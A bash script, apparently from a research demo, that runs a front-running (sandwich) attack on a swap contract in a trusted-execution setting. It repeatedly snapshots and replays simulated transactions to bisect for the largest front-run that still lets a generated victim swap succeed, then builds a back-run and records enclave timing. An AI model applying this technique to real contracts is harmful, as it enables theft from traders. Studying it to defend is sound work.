#!/bin/bash
set -e

source ./scripts/mev_utils.sh

CONTRACT_ADDRESS=`cat $CONTRACT_LOC/contractAddress.txt`
CODE_HASH=`cat $CONTRACT_LOC/codeHash.txt`

teebox set-snapshot $ADMIN "${UNIQUE_LABEL}-start"

echo
teebox query-balances $CONTRACT_ADDRESS --show-table --table-title "Balances before the front-running attack"

echo
teebox query-pools $CONTRACT_ADDRESS --show-table --table-title "Liquidity pools before the front-running attack"
#echo "Token A liquidity pool: $(query_pool pool_a)"
#echo "Token B liquidity pool: $(query_pool pool_b)"

# make victim tx
generate_and_sign_swap token_a 10 20 $VICTIM victim
echo
text=$'Swap [bold]10 [bright_magenta]Token A[/][/] for [bold]20 [deep_sky_blue1]Token B[/][/]\nSigned transaction is saved under [bold]tx_victim_sign.json[/] and ready for simulations'
teebox info-panel "${text}" --title "Victim Transaction Generation"
echo

# use the nano benchmark logs to measure the loop only
rm -f /tmp/ecall_handle_nanos.log
rm -f /tmp/ecall_query_nanos.log
touch /tmp/ecall_query_nanos.log

_timeit() {
    start=$1
    end=$2
    scale=$3
    _time=$(bc -l <<< "scale=$scale;($end - $start)/1000000000")
    echo $_time
}

declare -A chronos

teebox log "Starting bisection search ... :hourglass_flowing_sand:"

echo

cnt=-1
lo=0
hi=100

start_time=$(date +%s%N)

while [ $(expr $hi - $lo) -ne 1 ]; do
  start_loop=$(date +%s%N)
  cnt=$((cnt + 1))

  # set snapshot
  _start=$(date +%s%N)
  set_snapshot "${UNIQUE_LABEL}-${cnt}"
  end=$(date +%s%N)
  t1=$(_timeit $_start $end 5)

  mid=$((($hi + $lo) / 2))
  #echo "lo:$lo hi:$hi mid:$mid"

  # generate and sign adversary transaction
  _start=$(date +%s%N)
  generate_and_sign_swap token_a $mid 0 $ADV adv
  end=$(date +%s%N)
  t2=$(_timeit $_start $end 5)

  #echo "adv tx token_a $mid 0"

  # simulate front-running transaction
  _start=$(date +%s%N)
  simulate_tx adv
  end=$(date +%s%N)
  t3=$(_timeit $_start $end 5)
  
  # query the liquidity pool before simulating the victim transation
  _start=$(date +%s%N)
  old_pool_a=$(query_pool pool_a)
  end=$(date +%s%N)
  t4=$(_timeit $_start $end 5)

  # simulate victim transaction
  _start=$(date +%s%N)
  simulate_tx victim
  end=$(date +%s%N)
  t5=$(_timeit $_start $end 5)
  
  # query the liquidity pool after simulating the victim transaction
  _start=$(date +%s%N)
  new_pool_a=$(query_pool pool_a)
  end=$(date +%s%N)
  t6=$(_timeit $_start $end 5)
  
  dif_pool_a=$(($new_pool_a - $old_pool_a))
  #echo 'dif' $dif_pool_a

  if [ $dif_pool_a -gt 0 ]; then lo=$mid; else hi=$mid; fi

  end_loop=$(date +%s%N)
  tloop=$(_timeit $start_loop $end_loop 5)

  chronos[${cnt}]="$tloop,$t1,$t2,$t3,$t4,$t5,$t6"
done

end_time=$(date +%s%N)

teebox log "Bisection search completed :mag:"

sleep 2

echo

# save time measurements to file, for display with teebox
echo ${chronos[0]} > stats.csv
for i in $(seq ${cnt}); do
    echo ${chronos[${i}]} >> stats.csv
done

#ecall_init_time_nanos=$(awk '{ sum += $1 } END { print sum }' /tmp/ecall_init_nanos.log)
#ecall_init_time_millis=$( echo "$ecall_init_time_nanos / 1000000" | bc)
ecall_handle_time_nanos=$(awk '{ sum += $1 } END { print sum }' /tmp/ecall_handle_nanos.log)
ecall_handle_time_millis=$( echo "$ecall_handle_time_nanos / 1000000" | bc)
ecall_query_time_nanos=$(awk '{ sum += $1 } END { print sum }' /tmp/ecall_query_nanos.log)
ecall_query_time_millis=$( echo "$ecall_query_time_nanos / 1000000" | bc)
#ecalls_total_time_nanos=$( echo "$ecall_init_time_nanos + $ecall_handle_time_nanos + $ecall_query_time_nanos" | bc)
ecalls_total_time_nanos=$( echo "$ecall_handle_time_nanos + $ecall_query_time_nanos" | bc)
ecalls_total_time_millis=$( echo "$ecalls_total_time_nanos / 1000000" | bc)

total_time_nanos=$(echo "$end_time - $start_time" | bc)
total_time_millis=$(echo "$total_time_nanos / 1000000" | bc)

untrusted_time_nanos=$(echo "$total_time_nanos - $ecalls_total_time_nanos" | bc)
untrusted_time_millis=$(echo "$total_time_millis - $ecalls_total_time_millis" | bc)

#printf "\nTotal time spent for trial: ${total_time_nanos} nanosecs"
##printf "\nEstimated time spent for (trusted) ecall_init ${ecall_init_time_nanos} nanosecs"
#printf "\nEstimated time spent for (trusted) ecall_handle ${ecall_handle_time_nanos} nanosecs"
#printf "\nEstimated time spent for (trusted) ecall_query ${ecall_query_time_nanos} nanosecs"
#printf "\nEstimated time spent for (trusted) ecalls (handle & query) ${ecalls_total_time_nanos} nanosecs"
#printf "\nEstimated time spent for untrusted code ${untrusted_time_nanos} nanosecs\n"
#
#printf "\nTotal time spent for trial: ${total_time_millis} millisecs"
##printf "\nEstimated time spent for (trusted) ecall_init ${ecall_init_time_millis} millisecs"
#printf "\nEstimated time spent for (trusted) ecall_handle ${ecall_handle_time_millis} millisecs"
#printf "\nEstimated time spent for (trusted) ecall_query ${ecall_query_time_millis} millisecs"
#printf "\nEstimated time spent for (trusted) ecalls (handle & query) ${ecalls_total_time_millis} millisecs"
#printf "\nEstimated time spent for untrusted code ${untrusted_time_millis} millisecs\n\n"

cnt=$((cnt + 1))
set_snapshot "${UNIQUE_LABEL}-${cnt}"
#echo "final front-run tx token_a $lo 0"
old_pool_b=$(query_pool pool_b)
simulate_tx adv
new_pool_b=$(query_pool pool_b)
dif_pool_b=$(($old_pool_b - $new_pool_b))
generate_and_sign_swap token_b $dif_pool_b 0 $ADV adv_back
#echo "final back-run tx token_b $dif_pool_b 0"

echo
# broadcast all 3 txs
set_snapshot "${UNIQUE_LABEL}-final"
simulate_tx adv
simulate_tx victim
simulate_tx adv_back

## broadcast all 3 txs
#reset_snapshot
#broadcast_tx adv
#broadcast_tx victim
## send back-run tx
#execute_tx token_b $dif_pool_b 0 $ADV
#query_balances

teebox query-balances $CONTRACT_ADDRESS --show-table --table-title "Balances after the front-running attack"
teebox query-pools $CONTRACT_ADDRESS --show-table --table-title "Liquidity pools after the front-running attack"
teebox show-mev-stats stats.csv
